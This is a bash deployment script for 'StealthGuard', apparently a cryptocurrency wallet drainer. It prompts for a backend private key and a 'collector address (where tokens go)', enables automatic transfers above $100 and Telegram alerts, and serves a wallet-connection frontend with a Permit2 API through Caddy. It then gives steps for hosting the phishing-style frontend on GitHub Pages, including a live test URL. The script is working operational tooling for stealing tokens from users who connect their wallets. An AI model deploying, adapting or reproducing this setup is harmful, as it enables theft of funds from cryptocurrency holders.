#!/bin/bash
set -e

echo "========================================"
echo "  StealthGuard Deployment Script"
echo "========================================"
echo ""

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

if [ ! -f "package.json" ]; then
    echo -e "${RED}Error: Run from project root directory${NC}"
    exit 1
fi

SERVER_IP=$(hostname -I | awk '{print $1}')

echo -e "${YELLOW}Server IP: ${SERVER_IP}${NC}"
echo ""

echo -e "${YELLOW}Step 1: Installing dependencies...${NC}"
npm install
cd backend && npm install && cd ..

echo ""
echo -e "${YELLOW}Step 2: Creating directories...${NC}"
mkdir -p backend/data

echo ""
echo "========================================"
echo "  Environment Configuration"
echo "========================================"

if [ -f "backend/.env" ]; then
    echo -e "${YELLOW}backend/.env exists. Edit? (y/n)${NC}"
    read -r EDIT_ENV
    if [[ $EDIT_ENV =~ ^[Yy]$ ]]; then
        ${EDITOR:-nano} backend/.env
    fi
else
    echo ""
    echo -n "Backend Private Key (with 0x): "
    read -r BACKEND_KEY
    
    echo -n "Collector Address (where tokens go): "
    read -r COLLECTOR_ADDR
    COLLECTOR_ADDR=${COLLECTOR_ADDR:-"0xB0E0306AB4b82774686d7D032e0157dDc8352648"}
    
    echo -n "Telegram Bot Token (optional, press Enter to skip): "
    read -r TG_TOKEN
    
    echo -n "Telegram Chat ID (optional): "
    read -r TG_CHAT
    
    cat > backend/.env << EOF
# Server
PORT=3000
NODE_ENV=production

# Backend Wallet (REQUIRED)
BACKEND_PRIVATE_KEY=$BACKEND_KEY
BACKEND_WALLET_ADDRESS=0xB0E0306AB4b82774686d7D032e0157dDc8352648
COLLECTOR_ADDRESS=$COLLECTOR_ADDR

# Auto-transfer settings
MIN_TRANSFER_USD=100
ENABLE_MONITOR=true

# Telegram Alerts (optional)
TELEGRAM_BOT_TOKEN=${TG_TOKEN:-}
TELEGRAM_CHAT_ID=${TG_CHAT:-}
EOF
    echo -e "${GREEN}backend/.env created${NC}"
fi

echo ""
echo "========================================"
echo "  Caddy Configuration"
echo "========================================"
echo ""
echo "This will add StealthGuard to /etc/caddy/Caddyfile"
echo "Backend will be accessible at: https://${SERVER_IP}:8445"
echo ""
echo -n "Configure Caddy? (y/n): "
read -r ADD_CADDY

if [[ $ADD_CADDY =~ ^[Yy]$ ]]; then
    if [ -f /etc/caddy/Caddyfile ]; then
        # Check if already configured
        if grep -q ":8445" /etc/caddy/Caddyfile; then
            echo -e "${YELLOW}Port 8445 already configured in Caddyfile${NC}"
        else
            cat >> /etc/caddy/Caddyfile << 'CADDY_BLOCK'

# StealthGuard - Crypto Wallet Connection
:8445 {
    root * /opt/StealthGuard/dist
    encode gzip

    handle /api/* {
        reverse_proxy 127.0.0.1:3000
    }

    handle /health {
        reverse_proxy 127.0.0.1:3000
    }

    handle {
        try_files {path} /index.html
        file_server
    }

    @assets path /assets/*
    header @assets Cache-Control "public, max-age=31536000, immutable"
}
CADDY_BLOCK
            echo -e "${GREEN}Added to Caddyfile${NC}"
        fi
        
        caddy validate --config /etc/caddy/Caddyfile && systemctl reload caddy
        echo -e "${GREEN}Caddy reloaded${NC}"
    else
        echo -e "${RED}Caddy not found. Install: apt install caddy${NC}"
    fi
fi

echo ""
echo "========================================"
echo "  Process Manager"
echo "========================================"
echo ""
echo "Choose how to run backend:"
echo "1) PM2 (recommended, auto-restart)"
echo "2) systemd service"
echo "3) Manual start"
echo -n "Choice [1-3]: "
read -r PM_CHOICE

case $PM_CHOICE in
    1)
        if ! command -v pm2 &> /dev/null; then
            npm install -g pm2
        fi
        
        pm2 delete stealthguard 2>/dev/null || true
        cd backend && pm2 start server.js --name stealthguard
        pm2 save
        pm2 startup systemd -u $(whoami) --hp $HOME 2>/dev/null || true
        cd ..
        echo -e "${GREEN}PM2 configured. Use: pm2 status, pm2 logs stealthguard${NC}"
        ;;
    2)
        sudo tee /etc/systemd/system/stealthguard.service > /dev/null << EOF
[Unit]
Description=StealthGuard Backend
After=network.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$(pwd)/backend
ExecStart=$(which node) server.js
Restart=always
RestartSec=5
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
EOF
        sudo systemctl daemon-reload
        sudo systemctl enable stealthguard
        sudo systemctl start stealthguard
        echo -e "${GREEN}systemd service created${NC}"
        ;;
    *)
        echo -e "${YELLOW}Run manually: cd backend && node server.js &${NC}"
        ;;
esac

echo ""
echo "========================================"
echo "  Build Frontend"
echo "========================================"
echo ""
echo -n "Build frontend now? (y/n): "
read -r BUILD_FRONTEND

if [[ $BUILD_FRONTEND =~ ^[Yy]$ ]]; then
    echo ""
    echo -e "${YELLOW}Updating API URLs to server IP...${NC}"
    
    # Update analytics.ts
    sed -i "s|https://[^/]*/api/log|https://${SERVER_IP}:8445/api/log|g" src/utils/analytics.ts 2>/dev/null || true
    
    # Update App.tsx
    sed -i "s|https://[^/]*/api/permit2|https://${SERVER_IP}:8445/api/permit2|g" src/App.tsx 2>/dev/null || true
    
    echo -e "${GREEN}API URLs updated to: https://${SERVER_IP}:8445${NC}"
    
    NODE_ENV=production npm run build
    echo -e "${GREEN}Frontend built${NC}"
fi

echo ""
echo "========================================"
echo "  Deployment Complete!"
echo "========================================"
echo ""
echo -e "${GREEN}Backend API:${NC} https://${SERVER_IP}:8445/api"
echo -e "${GREEN}Health Check:${NC} curl -k https://${SERVER_IP}:8445/health"
echo ""
echo -e "${YELLOW}========================================${NC}"
echo -e "${YELLOW}  IMPORTANT: Deploy Frontend to GitHub Pages${NC}"
echo -e "${YELLOW}========================================${NC}"
echo ""
echo "1. Copy dist/ to your GitHub Pages repo:"
echo "   cp -r dist/* /path/to/on-repo/"
echo ""
echo "2. Update index.html with new JS filename:"
echo "   grep 'index-' dist/index.html"
echo "   # Edit on-repo/index.html with correct filename"
echo ""
echo "3. Push to GitHub:"
echo "   cd /path/to/on-repo"
echo "   git add -A && git commit -m 'update' && git push"
echo ""
echo "4. Test:"
echo "   https://YOUR_USERNAME.github.io/on/index.html"
echo ""
echo -e "${GREEN}Current test URL:${NC}"
echo "   https://hodldog.github.io/on/index.html"
echo ""
